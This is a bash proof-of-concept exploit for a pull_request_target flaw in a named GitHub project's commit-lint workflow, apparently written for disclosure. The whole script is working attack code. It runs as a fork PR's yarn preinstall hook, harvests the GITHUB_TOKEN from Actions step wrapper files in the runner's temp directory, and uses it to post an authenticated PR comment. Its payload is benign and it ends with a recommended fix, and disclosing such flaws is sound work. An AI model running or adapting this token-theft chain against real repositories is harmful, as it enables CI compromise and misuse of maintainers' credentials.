#!/usr/bin/env bash
#
# Proof of concept: pull_request_target RCE in oddlama/vane's
# .github/workflows/lint-commit.yml.
#
# The workflow is triggered by `pull_request_target`, checks out the
# fork-controlled PR head, then runs `yarn add ...`. Yarn classic invokes
# `scripts.preinstall` from the checked-out package.json before validating
# arguments or hitting the registry, which gives a fork PR arbitrary code
# execution on the runner with the base repository's GITHUB_TOKEN in scope.
#
# This script demonstrates the end-to-end chain by:
#   1. proving code execution under the runner identity,
#   2. recovering GITHUB_TOKEN from the step wrapper that Actions writes to
#      /home/runner/work/_temp, and
#   3. using the recovered token to post a single comment on the PR as
#      github-actions[bot].
#
set -euo pipefail

# preinstall may fire more than once during a single yarn invocation; only
# perform side effects on the first call.
readonly LOCK=/tmp/vane-poc.lock
[[ -e "$LOCK" ]] && exit 0
: > "$LOCK"

log()  { printf '[poc] %s\n' "$*" >&2; }
fail() { log "$*"; exit 0; }

for var in GITHUB_REPOSITORY GITHUB_EVENT_PATH GITHUB_RUN_ID; do
  [[ -n "${!var:-}" ]] || fail "missing env: $var"
done

PR_NUMBER=$(jq -r '.pull_request.number // empty' "$GITHUB_EVENT_PATH")
[[ -n "$PR_NUMBER" ]] || fail "no pull_request.number in event payload"

log "code execution on the runner: user=$(id -un) host=$(hostname)"
log "context: repo=${GITHUB_REPOSITORY} event=${GITHUB_EVENT_NAME:-?} run=${GITHUB_RUN_ID}"

# The workflow's `>> /dev/null 2>&1` redirect suppresses everything yarn
# writes, including our log output. The API call below is the visible side
# effect — see the PR comment authored by github-actions[bot].

# Actions inlines GITHUB_TOKEN as a literal into the per-step wrapper script
# rather than exporting it to the environment. Recover it from there.
recover_token() {
  local file token
  for file in /home/runner/work/_temp/*.sh; do
    [[ -r "$file" ]] || continue
    token=$(grep -oE 'Authorization: Bearer [A-Za-z0-9_]+' "$file" \
            | head -n1 \
            | awk '{print $3}')
    if [[ -n "$token" ]]; then
      printf '%s' "$token"
      return 0
    fi
  done
  return 1
}

TOKEN=$(recover_token) || fail "could not recover GITHUB_TOKEN from runner step wrapper"
log "recovered GITHUB_TOKEN (${#TOKEN} chars) from runner step wrapper"

read -r -d '' COMMENT <<'EOF' || true
**Proof of concept — `pull_request_target` RCE**

This comment was posted from a fork PR via the `lint-commit.yml` workflow:

1. The workflow uses `on: pull_request_target` and checks out the fork-controlled PR head SHA.
2. It then runs `yarn add ...`, which invokes `scripts.preinstall` from the checked-out `package.json` before validating arguments or contacting the registry.
3. A malicious `scripts.preinstall` runs arbitrary code on the runner.
4. `GITHUB_TOKEN` is recovered from the step wrapper script in `/home/runner/work/_temp` and used to authenticate this comment.

The payload is benign. Recommended fix: change the trigger from `pull_request_target` to `pull_request` — commit-message linting does not require write-scoped access to the base repository.
EOF

PAYLOAD=$(jq -n --arg body "$COMMENT" '{body: $body}')
HTTP_CODE=$(curl --silent --show-error --output /tmp/poc-response.json \
  --write-out '%{http_code}' \
  --request POST \
  --header "Authorization: Bearer $TOKEN" \
  --header "Accept: application/vnd.github+json" \
  --header "Content-Type: application/json" \
  --data "$PAYLOAD" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments")

log "comment POST -> HTTP $HTTP_CODE"
if [[ "$HTTP_CODE" != "201" ]]; then
  log "response: $(jq -c . /tmp/poc-response.json 2>/dev/null || cat /tmp/poc-response.json)"
fi
